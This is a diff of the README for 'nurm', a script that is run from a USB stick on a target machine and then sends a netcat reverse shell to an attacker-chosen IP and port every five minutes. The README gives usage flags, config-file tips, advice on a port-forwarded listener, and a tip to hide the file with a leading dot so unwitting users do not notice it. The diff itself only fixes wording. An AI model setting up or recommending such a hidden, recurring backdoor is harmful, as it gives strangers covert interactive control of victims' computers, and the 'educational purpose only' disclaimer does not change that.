@@ -7,7 +7,6 @@
 Once run from the usb, nurm will send the reverse shell to any ip address and port that the user specified every five minutes, allowing the following device with the given ip address to access an interactive shell of the target given that the device is listening to the port specified.
 
 ## Usage
-**nurm**  
 1) Download the script to your favorite usb stick
 2) Run the script on the target machine once.  
    **Usage(v 1.3)**: `./nurm [-a ipaddress] [-p port] [-f full-path-filename] [-c]`  
@@ -22,16 +21,16 @@ Once run from the usb, nurm will send the reverse shell to any ip address and po
 `./nurm` will create a script according to the configuration in nurm.conf
 
 ## Precautions/ Tips
-1) Always hide the file with ".". For example, .test. This way, many unexperienced users will never be ware of the script.
-2) The listening device should either be a server or a computer with static ip address. Otherwise, your computer can only be used once.
+1) Always hide the file with ".". For example, *.test*. This way, many unexperienced users will never be aware of the script.
+2) The listening device should either be a server or a computer with static ip address with properly port-forwarded configuration. Otherwise, the connection will be temporary.
 3) Use the nurm.conf to keep track of your server port and to save your time.
 4) For optimization reason, **the variable order of nurm.conf is designed to be unchanged. Changing the order of dport variable will break the config file.**
-4) **This script is for educational purpose only. Don't use it to do illegal activities. You are the only responsible for your actions!**
+4) **This script is for educational purpose only. Don't use it to do illegal activities. You are solely responsible for your actions!**
 
 ## Status
-Currently only support netcat reverse shell.
+Currently only supports netcat reverse shell.
 Now supports config file to save your time.
 Supports partial override 
 
 ## Upcoming features
-- most reverse-shell support for common langauges
+- most reverse-shell support for common languages
